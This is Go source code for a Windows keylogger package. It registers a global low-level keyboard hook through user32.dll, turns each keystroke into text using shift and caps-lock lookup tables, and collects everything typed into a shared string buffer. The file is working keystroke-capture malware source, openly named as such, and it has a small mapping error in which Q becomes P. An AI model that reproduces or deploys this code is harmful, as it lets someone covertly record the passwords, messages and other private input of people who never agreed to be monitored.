package keylogger

import (
	"github.com/TheTitanrain/w32"
	"golang.org/x/sys/windows"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

//未按shift
var keys_lower = map[uint16]string{
	8:  "[Back]",
	9:  "[Tab]",
	10: "[Shift]",
	13: "[Enter]",
	// 13:  "[Enter]\r\n",
	14:  "",
	15:  "",
	16:  "",
	17:  "[Ctrl]",
	18:  "[Alt]",
	19:  "",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "a",
	66:  "b",
	67:  "c",
	68:  "d",
	69:  "e",
	70:  "f",
	71:  "g",
	72:  "h",
	73:  "i",
	74:  "j",
	75:  "k",
	76:  "l",
	77:  "m",
	78:  "n",
	79:  "o",
	80:  "p",
	81:  "q",
	82:  "r",
	83:  "s",
	84:  "t",
	85:  "u",
	86:  "v",
	87:  "w",
	88:  "x",
	89:  "y",
	90:  "z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ";",
	187: "=",
	188: ",",
	189: "-",
	190: ".",
	191: "/",
	192: "`",
	219: "[",
	220: "\\",
	221: "]",
	222: "'",
	223: "!",
}

//SHIFT
var keys_upper = map[uint16]string{
	8:  "[Back]",
	9:  "[Tab]",
	10: "[Shift]",
	13: "[Enter]",
	// 13:  "[Enter]\r\n",
	17:  "[Ctrl]",
	18:  "[Alt]",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  ")",
	49:  "!",
	50:  "@",
	51:  "#",
	52:  "$",
	53:  "%",
	54:  "^",
	55:  "&",
	56:  "*",
	57:  "(",
	65:  "A",
	66:  "B",
	67:  "C",
	68:  "D",
	69:  "E",
	70:  "F",
	71:  "G",
	72:  "H",
	73:  "I",
	74:  "J",
	75:  "K",
	76:  "L",
	77:  "M",
	78:  "N",
	79:  "O",
	80:  "P",
	81:  "Q",
	82:  "R",
	83:  "S",
	84:  "T",
	85:  "U",
	86:  "V",
	87:  "W",
	88:  "X",
	89:  "Y",
	90:  "Z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ":",
	187: "+",
	188: "<",
	189: "_",
	190: ">",
	191: "?",
	192: "~",
	219: "°",
	220: "|",
	221: "}",
	222: "\"",
	223: "!",
}

//大小写
var capup = map[uint16]string{
	8:  "[Back]",
	9:  "[Tab]",
	10: "[Shift]",
	// 13:  "[Enter]\r\n",
	13:  "[Enter]",
	14:  "",
	15:  "",
	16:  "",
	17:  "[Ctrl]",
	18:  "[Alt]",
	19:  "",
	20:  "", //CAPS LOCK
	27:  "[Esc]",
	32:  " ", //SPACE
	33:  "[PageUp]",
	34:  "[PageDown]",
	35:  "[End]",
	36:  "[Home]",
	37:  "[Left]",
	38:  "[Up]",
	39:  "[Right]",
	40:  "[Down]",
	41:  "[Select]",
	42:  "[Print]",
	43:  "[Execute]",
	44:  "[PrintScreen]",
	45:  "[Insert]",
	46:  "[Delete]",
	47:  "[Help]",
	48:  "0",
	49:  "1",
	50:  "2",
	51:  "3",
	52:  "4",
	53:  "5",
	54:  "6",
	55:  "7",
	56:  "8",
	57:  "9",
	65:  "A",
	66:  "B",
	67:  "C",
	68:  "D",
	69:  "E",
	70:  "F",
	71:  "G",
	72:  "H",
	73:  "I",
	74:  "J",
	75:  "K",
	76:  "L",
	77:  "M",
	78:  "N",
	79:  "O",
	80:  "P",
	81:  "P",
	82:  "R",
	83:  "S",
	84:  "T",
	85:  "U",
	86:  "V",
	87:  "W",
	88:  "X",
	89:  "Y",
	90:  "Z",
	91:  "[Windows]",
	92:  "[Windows]",
	93:  "[Applications]",
	94:  "",
	95:  "[Sleep]",
	96:  "0",
	97:  "1",
	98:  "2",
	99:  "3",
	100: "4",
	101: "5",
	102: "6",
	103: "7",
	104: "8",
	105: "9",
	106: "*",
	107: "+",
	108: "[Separator]",
	109: "-",
	110: ".",
	111: "[Divide]",
	112: "[F1]",
	113: "[F2]",
	114: "[F3]",
	115: "[F4]",
	116: "[F5]",
	117: "[F6]",
	118: "[F7]",
	119: "[F8]",
	120: "[F9]",
	121: "[F10]",
	122: "[F11]",
	123: "[F12]",
	144: "[NumLock]",
	145: "[ScrollLock]",
	160: "", //LShift
	161: "", //RShift
	162: "[Ctrl]",
	163: "[Ctrl]",
	164: "[Alt]", //LeftMenu
	165: "[RightMenu]",
	186: ";",
	187: "=",
	188: ",",
	189: "-",
	190: ".",
	191: "/",
	192: "`",
	219: "[",
	220: "\\",
	221: "]",
	222: "'",
	223: "!",
}

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
)

type (
	DWORD     uint32
	WPARAM    uintptr
	LPARAM    uintptr
	LRESULT   uintptr
	HANDLE    uintptr
	HINSTANCE HANDLE
	HHOOK     HANDLE
	HWND      HANDLE
)

type HOOKPROC func(int, WPARAM, LPARAM) LRESULT

type KBDLLHOOKSTRUCT struct {
	VkCode      DWORD
	ScanCode    DWORD
	Flags       DWORD
	Time        DWORD
	DwExtraInfo uintptr
}

type POINT struct {
	X, Y int32
}

type MSG struct {
	Hwnd    HWND
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      POINT
}

var (
	user32                  = windows.NewLazySystemDLL("user32.dll")
	procSetWindowsHookEx    = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessage          = user32.NewProc("GetMessageW")
	procGetKeyState         = user32.NewProc("GetKeyState")
	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
	keyboardHook            HHOOK
	tmpKeylog               string

	stringBuffer = ""
	mutex        sync.Mutex
)

func SetWindowsHookEx(idHook int, lpfn HOOKPROC, hMod HINSTANCE, dwThreadId DWORD) HHOOK {
	tmp := *procSetWindowsHookEx
	ret, _, _ := tmp.Call(
		uintptr(idHook),
		uintptr(syscall.NewCallback(lpfn)),
		uintptr(hMod),
		uintptr(dwThreadId),
	)
	return HHOOK(ret)
}

func CallNextHookEx(hhk HHOOK, nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
	tmp := *procCallNextHookEx
	ret, _, _ := tmp.Call(
		uintptr(hhk),
		uintptr(nCode),
		uintptr(wParam),
		uintptr(lParam),
	)
	return LRESULT(ret)
}

func UnhookWindowsHookEx(hhk HHOOK) bool {
	tmp := *procUnhookWindowsHookEx
	ret, _, _ := tmp.Call(
		uintptr(hhk),
	)
	return ret != 0
}

func GetMessage(msg *MSG, hwnd HWND, msgFilterMin uint32, msgFilterMax uint32) int {
	tmp := *procGetMessage
	ret, _, _ := tmp.Call(
		uintptr(unsafe.Pointer(msg)),
		uintptr(hwnd),
		uintptr(msgFilterMin),
		uintptr(msgFilterMax))
	return int(ret)
}

// 真正实现HOOK的部分
func realKeylogger() {
	var msg MSG
	tmp_1 := *procGetKeyState
	CAPS, _, _ := tmp_1.Call(uintptr(w32.VK_CAPITAL))
	CAPS = CAPS & 0x000001
	var CAPS2 uintptr
	var SHIFT uintptr
	precLog := ""
	var num = 0
	//var write bool = false
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(func(nCode int, wparam WPARAM, lparam LPARAM) LRESULT {
		if nCode == 0 && wparam == WM_KEYDOWN {
			tmp_2 := *procGetAsyncKeyState
			SHIFT, _, _ = tmp_2.Call(uintptr(w32.VK_SHIFT))
			if SHIFT == 32769 || SHIFT == 32768 {

				SHIFT = 1
			}
			kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))
			code := byte(kbdstruct.VkCode)
			if code == w32.VK_CAPITAL {
				if CAPS == 1 {
					CAPS = 0
				} else {
					CAPS = 1
				}
			}
			if SHIFT == 1 {
				CAPS2 = 1
			} else {
				CAPS2 = 0
			}
			//未按shift
			if CAPS == 0 && CAPS2 == 0 {
				tmpKeylog += keys_lower[uint16(code)]
			} else if CAPS2 == 1 {
				tmpKeylog += keys_upper[uint16(code)]
			} else {
				tmpKeylog += capup[uint16(code)]
			}

		}
		if tmpKeylog != "" {
			num++
			precLog = tmpKeylog
			// log.Println(tmpKeylog)
			add2StringBuffer(tmpKeylog)
			tmpKeylog = ""
		}
		return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
	}), 0, 0)

	for GetMessage(&msg, 0, 0, 0) != 0 {
		time.Sleep(1 * time.Millisecond)
	}

	UnhookWindowsHookEx(keyboardHook)
	keyboardHook = 0
}

// 将Hook中得到的击键添加到stirngbuffer中
func add2StringBuffer(str2Add string) {
	mutex.Lock()
	stringBuffer += str2Add
	mutex.Unlock()
}
